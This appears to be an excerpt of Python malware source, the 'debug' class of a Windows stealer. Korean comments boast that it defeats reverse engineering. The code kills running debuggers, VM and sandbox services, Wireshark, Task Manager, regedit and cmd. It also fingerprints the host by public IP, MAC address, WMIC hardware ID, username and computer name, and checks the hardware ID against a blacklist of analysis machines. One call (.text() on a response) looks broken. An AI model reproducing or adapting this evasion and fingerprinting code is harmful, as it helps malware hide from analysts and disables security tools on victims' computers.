...
class debug:
    ...
    def check(self) -> bool:
        ...
        self.blacklistedProcesses = ["httpdebuggerui", "wireshark", "regedit", "cmd", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg",
                                     "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"]
        # ㄹㅣ버싱 까지 방지 한다구요!!!
    ...
    def check_process(self) -> bool:
        for process in psutil.process_iter():
            if any(procstr in process.name().lower() for procstr in self.blacklistedProcesses): # 블랙리스트에 있는 프로세스가 실행중일 경우...
                try:
                    process.kill() # 리버싱 안되지롱 ㅋㅋ
                except (psutil.NoSuchProcess, psutil.AccessDenied): # 감지 프로그램을 발견하지 못했을 경우
                    pass
    
    def network(self) -> bool:
        ip = requests.get('https://api.ipify.org').text()
        mac = ':'.join(re.findall('..', '%012x' %  uuid.getnode())) # 맥이 어떤 식으로 만들어지는 지 알면 이해 ㄱㄴ
    ...
    def system(self) -> bool:
        hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,
                                        stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip() # wmic를 실행시켜서 hwid를 얻어옴

        username = os.getenv("UserName") # pc 유저이름과 컴이름을 가져옴
        hostname = os.getenv("COMPUTERNAME")

        if hwid in self.blackListedHWIDS: # 블랙리스트 필터링
            return True
